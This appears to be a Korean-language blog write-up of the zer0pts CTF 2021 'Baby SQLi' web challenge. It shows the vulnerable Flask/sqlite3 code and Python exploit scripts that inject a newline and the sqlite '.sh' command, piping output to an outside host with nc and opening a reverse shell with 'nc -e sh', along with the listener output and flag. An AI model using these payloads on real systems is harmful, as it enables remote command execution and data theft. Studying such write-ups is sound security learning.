---
layout: post
date: 2021-03-08 00:00:10
title: "zer0pts CTF 2021 Write Up"
categories: CTF
tags: [SQL Injection]
author:
  - Jeongwon Jo

---
## <span style="color:#21C587"></span> (Web) Baby SQLi [170 pts]

> Baby SQLi challenge is in sqlite3 using the escape character is a string. This using to excute the shell.

일단 SQLite3에서는 `.system/.shell/.sh` 명령어들을 이용해서 쉘 명령어를 실행시킬 수 있습니다.

```
// SQLite3 CLI
sqlite> .sh id|nc 141.164.52.207 2

// Terminal
root@py:~# nc -lp 2
uid=0(root) gid=0(root) groups=0(root)
```
위를 보면 sqlite3에서 `.sh` 명령어를 이용해서 쉘 명령어를 실행시키는 것을 볼 수 있습니다.

```python
def sqlite3_query(sql):
    p = subprocess.Popen(['sqlite3', 'database.db'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    o, e = p.communicate(sql.encode())
    if e:
        raise Exception(e)
    result = []
    for row in o.decode().split('\n'):
        if row == '': break
        result.append(tuple(row.split('|')))
    return result
```
문제 코드를 보면 `sqlite3_query()` 함수에서 `subporcess.Popen()`에서 `comunicate()`를 이용해서 CLI를 사용하고 있어 `\n` 문자를 이용해서 SQLite3 상에서 줄띄움을 시킬 수 있습니다.

```python
@app.route('/login', methods=['post'])
def auth():
    username = flask.request.form.get('username', default='', type=str)
    password = flask.request.form.get('password', default='', type=str)
    if len(username) > 32 or len(password) > 32:
        flask.session['msg'] = 'Too long username or password'
        return flask.redirect(flask.url_for('home'))

    password_hash = hashlib.sha256(password.encode()).hexdigest()
    result = None
    try:
        result = sqlite3_query(
            'SELECT * FROM users WHERE username="{}" AND password="{}";'
            .format(sqlite3_escape(username), password_hash)
        )
    except:
        pass

    if result:
        flask.session['name'] = username
    else:
        flask.session['msg'] = 'Invalid Credential'
    return flask.redirect(flask.url_for('home'))
```
그리고 login 로직의 코드를 보면 `username`/`password` 값을 입력 받아와서 길이 검증을 하고, 쿼리문으로 넣어주는 것을 볼 수 있습니다. 그리고 이때 `username`의 값을 이스케이프 처리를 시켜주는 것을 볼 수 있습니다. 하지만 `SQLite`에서 `\` 이스케이프 문자는 단순 문자열로 처리하기 때문에 딱히 신경 쓰지 않아도 됩니다.

```
SELECT * FROM users where username = "\" or 1=1 -- " and password = "pocas";
```
즉, 위와 같이 이스케이프 처리가 돼도 상관이 없습니다.

```
SELECT * FROM users where username = "\";
.sh id|nc 141.164.52.207 2;
and password = "pocas";
```
그러니 위와 같이 줄띄움을 해서 `.sh` 명령어를 사용해주면 쉘 명령어를 사용할 수 있습니다.

```python
import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.sh id|nc 2376348879 2\n'
data = {"username": username, "password": "pocas"}
requests.post(url+"/login", data)
```
```
root@py:~# nc -lp 2
uid=1000(app) gid=1000(app)
root@py:~#
```
위와 같이 익스 코드를 작성해주면 `SELECT` 문을 닫아주고, 바로 밑 줄에는 `.sh` 명령어가 실행이 됩니다. 

```python
import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.sh nc 2376348879 2 -e sh\n'
data = {"username": username, "password": "pocas"}
requests.post(url+"/login", data)
```
```
root@py:~# nc -lvnp 2
Listening on 0.0.0.0 2
Connection received on 165.227.180.221 38761
id
uid=1000(app) gid=1000(app)
cat templates/index.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>
```
그래서 `nc`의 `e` 옵션을 이용해서 쉘을 전달하고, `index.html` 파일을 읽어보니 플래그가 있는 것을 볼 수 있었습니다.

> FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}

---
